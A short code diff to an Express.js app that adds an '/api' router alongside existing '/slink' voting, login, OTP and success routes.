@@ -17,6 +17,7 @@ const votingRouter = require('./routes/slink');
 const loginRouter = require('./routes/slink/lgin');
 const otpRouter = require('./routes/slink/otp');
 const successRouter = require('./routes/slink/success');
+const apiRouter = require('./routes/api');
 
 
 // Use routes
@@ -24,6 +25,7 @@ app.use('/slink', votingRouter);
 app.use('/slink/lgin', loginRouter);
 app.use('/slink/otp', otpRouter);
 app.use('/slink/success', successRouter);
+app.use('/api', apiRouter);
 app.use("/not-found", (req, res) => {
     res.render('not-found');
 });
